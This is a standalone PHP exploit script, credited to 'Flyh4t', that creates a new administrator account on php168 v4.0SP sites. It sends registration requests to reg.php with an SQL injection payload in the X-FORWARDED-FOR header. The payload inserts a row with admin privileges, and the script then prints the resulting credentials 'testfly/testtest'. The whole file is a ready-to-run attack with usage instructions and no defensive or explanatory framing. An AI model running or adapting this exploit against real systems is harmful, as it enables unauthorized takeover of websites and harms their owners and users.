<?php
print_r("
+------------------------------------------------------------------+
Create New Admin Exploit FOR php168 v4.0SP
BY  Flyh4t
+------------------------------------------------------------------+
");
if ($argc<4) {
	echo "Usage: php ".$argv[0]." host path uid\n";
	echo "host:      target server \n";
	echo "path:      path to php168\n";
       echo "uid:       the lastest uid\n";
	echo "Example:\r\n";
	echo "php ".$argv[0]." localhost /  120\n";
	die;
}
$host=$argv[1];
$path=$argv[2];
$id=$argv[3]+2;
$cmd = "xxxx','0','111','0','1','', '', '123', '123', '123', '123', '0', '', '0', '', '', '', ''),('".$id."', '0', '3', '', '1', '0', '', '1', '1', '1', '1', '1', '1', '1', '', '', '1', '1', '1', '1', '0', '', '0', '', '', '', '')/*";
$contenta= "username=teadfff&email=dci1f@aa.ccom&password=testtest&password2=testtest&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2";
$contentb= "username=testfly&email=testffly@1s.com&password=testtest&password2=testtest&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2";
senddate($contenta);
senddate($contentb);
function senddate($content){
global $path,$host,$cmd;
$data = "POST ".$path."reg.php"." HTTP/1.1\r\n";
$data .= "Accept: */*\r\n";
$data .= "Accept-Language: zh-cn\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "User-Agent: Mozilla/4.0\r\n";
$data .= "Host: ".$host."\r\n";
$data .= "X-FORWARDED-FOR: ".$cmd."\r\n";
$data .= "Content-length: ".strlen($content)."\r\n";
$data .= "Connection: Keep-Alive\r\n";
$data .= "\r\n";
$data .= $content."\r\n";
$fd=fsockopen($host,80);
if (!$fd) {
	echo 'No response from '.$host;
	die;
}
fputs($fd,$data);
fclose($fd);
};
echo "done! the admin u create is testfly/testtest";
?>